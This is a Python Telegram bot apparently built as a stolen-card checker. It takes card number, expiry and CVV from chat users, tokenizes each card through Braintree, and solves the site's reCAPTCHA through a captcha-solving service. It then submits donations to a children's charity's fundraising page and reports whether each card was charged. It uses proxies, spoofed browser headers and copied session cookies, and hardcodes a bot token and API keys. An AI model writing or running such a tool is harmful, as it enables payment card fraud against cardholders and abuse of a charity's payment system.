import logging
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import requests
import json
import re
import time

# Global proxy settings
proxy_config = None

class BraintreeTool:
    def __init__(self):
        self.api_url = "https://payments.braintree-api.com/graphql"
        self.captcha_url = "https://autocaptcha.pro/apiv3/process"
        self.payment_url = "https://fundraising.childhood.org.au/payments/donate/embedded"
        self.status_url = "https://fundraising.childhood.org.au/payments/donate/retrieve-payment-status"

    def _validate_card(self, cc, mes, ano, cvv):
        # Validation logic here
        if len(cc) not in [15, 16] or cc[0] not in ['3', '4', '5', '6']:
            return False
        if len(mes) != 2 or not (1 <= int(mes) <= 12):
            return False
        if len(ano) == 2:
            ano = "20" + ano
        if int(ano) < 2021 or int(ano) > 2029:
            return False
        if len(cvv) not in [3, 4]:
            return False
        return True

    def tokenize_credit_card(self, cc, mes, ano, cvv):
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "NA"
            },
            "query": """
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   
                    tokenizeCreditCard(input: $input) {     
                        token     
                        creditCard {       
                            bin       
                            brandCode       
                            last4       
                            expirationMonth      
                            expirationYear      
                        }   
                    } 
                }
            """,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mes,
                        "expirationYear": ano,
                        "cvv": cvv
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": "Bearer production_mb3d6dk2_yp2cn3cq7mt3jzpw",
            "Braintree-Version": "2018-05-10",
            "Connection": "keep-alive",
            "Content-Length": "754",
            "Content-Type": "application/json",
            "Host": "payments.braintree-api.com",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
        }

        # Check if proxy is set
        proxies = None
        if proxy_config:
            proxies = {
                'http': f"http://{proxy_config}",
                'https': f"https://{proxy_config}"
            }

        response = requests.post(self.api_url, headers=headers, json=payload, proxies=proxies)
        if response.status_code == 200:
            return response.json()['data']['tokenizeCreditCard']['token']
        else:
            return None

    def get_captcha(self):
        captcha_payload = {
            "key": "f85a2bb5c748b3f78eaea839d89b1f64",
            "type": "recaptchav2",
            "googlesitekey": "6LcavOAjAAAAAJ3ApKU6NcsLJJm26rP4DJiI0UTJ",
            "pageurl": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268"
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }

        response = requests.post(self.captcha_url, headers=headers, json=captcha_payload)
        if response.status_code == 200:
            return response.json().get('captcha')
        return None

    def process_payment(self, token, captcha):
        payment_payload = {
            "DonationType": "D",
            "TokenDetailsForTransaction": {
                "Token": token,
                "Type": "CC",
                "CredentialHolder": "Thanh Vu"
            },
            "TuringTest": captcha
        }

        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "1771",
            "Host": "fundraising.childhood.org.au",
            "Origin": "https://fundraising.childhood.org.au",
            "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
            "RequestVerificationToken": "ceH0CkTb8gWQ6JVU3uq0jdoJnJzPF9ReeGawyEBJ58iDyTHoTkMePKNdMT6ziA36kZ23ZBGsPyqm3npX_n0eYZe3nqs1:fWydDKhIC_5tk8_3p_JlMUsXvcOKhyubMZPC5k3RHRZPn76LAlmpVfPuER7laPcgVQb9e8FJb7-jcO4p5gkuiqje0Os1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
            "Cookie": "ASP.NET_SessionId=origx1a40de34ibfv0bykmqh; _gcl_au=1.1.314313641.1722444236; _ga_KEF89HY38C=GS1.1.1722444236.1.0.1722444236.60.0.0"
        }

        response = requests.post(self.payment_url, headers=headers, json=payment_payload)
        if response.status_code == 200:
            return response.json()['data']['ReferenceId']
        return None

    def check_payment_status(self, ref_id):
        status_payload = {"clientReferenceId": ref_id}
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "60",  # Không cần nếu dùng requests, nó tự xử lý
            "Host": "fundraising.childhood.org.au",
            "Origin": "https://fundraising.childhood.org.au",
            "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
            "RequestVerificationToken": "undefined",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
            "Cookie": "ASP.NET_SessionId=origx1a40de34ibfv0bykmqh; _gcl_au=1.1.314313641.1722444236"
        }

        response = requests.post(self.status_url, headers=headers, json=status_payload)
        if response.status_code == 200:
            return response.json().get('data', {}).get('PaymentStatus', 'Failed')
        return 'Failed'


# Define the bot commands
async def handle_be(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /be <cc>|<mes>|<ano>|<cvv>")
        return

    card_info = context.args[0].split('|')
    if len(card_info) != 4:
        await update.message.reply_text("Invalid input format.")
        return

    cc, mes, ano, cvv = card_info

    # Call BraintreeTool to process the card
    tool = BraintreeTool()
    token = tool.tokenize_credit_card(cc, mes, ano, cvv)

    if token:
        captcha = tool.get_captcha()
        if captcha:
            ref_id = tool.process_payment(token, captcha)
            if ref_id:
                await update.message.reply_text(f"Payment submitted for card {cc[-4:]}, waiting for status...")
                time.sleep(7)  # Delay 7 seconds
                status = tool.check_payment_status(ref_id)
                await update.message.reply_text(f"Payment status for card {cc[-4:]}: {status}")
            else:
                await update.message.reply_text("Payment process failed.")
        else:
            await update.message.reply_text("Failed to retrieve captcha.")
    else:
        await update.message.reply_text(f"Failed to tokenize card {cc[-4:]}. Invalid card details or tokenization failed.")


async def handle_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global proxy_config
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /proxy <ip>:<port>:<username>:<password>")
        return

    proxy_config = context.args[0]
    await update.message.reply_text(f"Proxy set to: {proxy_config}")


# Main function to run the bot
def main():
    application = ApplicationBuilder().token('5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro').build()

    # Define commands
    application.add_handler(CommandHandler("be", handle_be))
    application.add_handler(CommandHandler("proxy", handle_proxy))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()

